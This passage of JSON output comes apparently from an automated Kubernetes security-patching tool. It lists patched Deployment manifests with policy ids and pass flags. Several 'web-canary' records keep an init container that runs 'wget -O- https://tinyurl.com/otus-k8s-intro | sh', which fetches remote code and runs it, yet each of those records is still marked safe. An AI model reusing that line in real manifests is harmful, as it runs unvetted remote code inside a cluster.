    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01134",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01135",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01136",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01137",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01138",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01139",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01140",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01141",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01142",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01143",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01144",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01145",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
